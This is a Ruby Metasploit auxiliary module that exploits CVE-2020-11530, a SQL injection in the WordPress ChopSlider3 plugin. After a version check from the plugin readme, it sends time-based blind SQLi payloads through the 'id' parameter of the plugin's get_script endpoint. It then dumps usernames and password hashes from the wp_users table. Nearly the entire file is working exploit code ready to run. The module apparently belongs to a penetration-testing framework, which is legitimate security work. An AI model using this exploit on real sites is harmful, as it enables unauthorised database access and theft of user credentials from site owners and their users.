##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress ChopSlider3 id SQLi Scanner',
        'Description' => %q{
        },
        'Author' =>
          [
            'h00die', # msf module
            'SunCSR', # edb module
            'Callum Murphy <callum.a.murphy.77@gmail.com>' # full disclosure
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['EDB', '48457'],
            ['CVE', '2020-11530'],
            ['URL', 'https://seclists.org/fulldisclosure/2020/May/26']
          ],
        'Actions' => [
          ['List Users', 'Description' => 'Queries username, password hash for COUNT users'],
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2020-05-12'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1]),
    ]
  end

  def run_host(_ip)
    unless wordpress_and_online?
      vprint_error('Server not online or not detected as wordpress')
      return
    end

    checkcode = check_plugin_version_from_readme('chopslider', '3.4')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error('ChopSlider3 version not vulnerable')
      return
    else
      print_good('Vulnerable version detected')
    end

    sliderid = Rex::Text.rand_text_numeric(8..10)
    #cookie = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'wp-login.php') }).get_cookies
    # text = Rex::Text::rand_text_alpha(3,5)
    #password = Rex::Text.rand_text_alpha(10)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      #if payload.include?('<')
      #  payload.gsub!(/<>/, '=')
      #  payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { '0,' + Regexp.last_match(1) }
      #end
      payload = Rex::Text.uri_encode(payload)
      res = send_request_raw({
        'method' => 'GET',
        'uri' => "#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'chopslider', 'get_script', 'index.php')}?id=#{sliderid}%20OR%201=1%20AND%20#{payload}"
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user_login', 'user_pass']
    results = @sqli.dump_table_fields('wp_users', columns, condition = '', num_limit = datastore['COUNT'])
    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    results.each do |user|
      table << user
    end
    print_good(table.to_s)
  end
end
